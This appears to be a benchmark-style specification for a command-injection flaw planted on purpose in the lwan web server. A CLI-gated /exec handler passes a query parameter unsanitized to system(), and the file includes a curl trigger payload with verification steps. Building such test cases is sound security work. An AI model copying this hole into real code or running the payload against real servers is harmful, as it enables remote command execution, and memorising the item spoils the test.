DESCRIPTION:
  CLI-flag-gated command injection with two flags stored in a struct. The server
  must be started with --exec-mode (sets exec_cfg.enabled=1) for the /exec
  endpoint to be reachable. User input flows directly into system() with no
  sanitization. A second flag --exec-verbose controls response verbosity.

CONFIG_GATE (C2 — two flags in struct):
  mechanism:  CLI long options (--exec-mode, --exec-verbose) stored in
              struct exec_config { int enabled; int verbose; } exec_cfg
  check:      `if (!exec_cfg.enabled) return HTTP_NOT_FOUND;`
  complexity: one struct, two fields, two flags; check reads struct member

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>
  path:       lwan trie routes /exec prefix to handle_exec()
              handle_exec() calls lwan_request_get_query_param(request, "cmd")
              the raw, URL-decoded string is passed directly to system()
  transforms: lwan URL-decodes query params before lookup (standard behavior)

SANITIZATION (S1 — none):
  none

SINK:        system() in handle_exec() (src/bin/lwan/main.c)

CHANGED FILES:
  src/bin/lwan/main.c — 5 hunks:
    1. includes:       added #include <string.h>
    2. global:         added exec_config struct definition and exec_cfg instance
    3. parse_args():   added --exec-mode/-E and --exec-verbose/-V options;
                       changed default result to ARGS_SERVE_FILES
    4. handle_exec():  new handler with C2 struct guard, I1 direct sink
    5. main():         added /exec entry before / in URL map

EXPLOIT:
  build:   bash build.sh
  start:   ./lwan -r /tmp/www -l '*:18085' --exec-mode
  trigger: curl 'http://127.0.0.1:18085/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode leaves exec_cfg.enabled=0; /exec returns 404

NOTES:
  - system() output goes to the server's stdout/stderr, not the HTTP body.
  - The --exec-verbose flag changes the response body format but has no
    security significance; it exists to satisfy C2 (two flags in struct).
  - lwan URL-decodes query parameters before passing them to the handler.
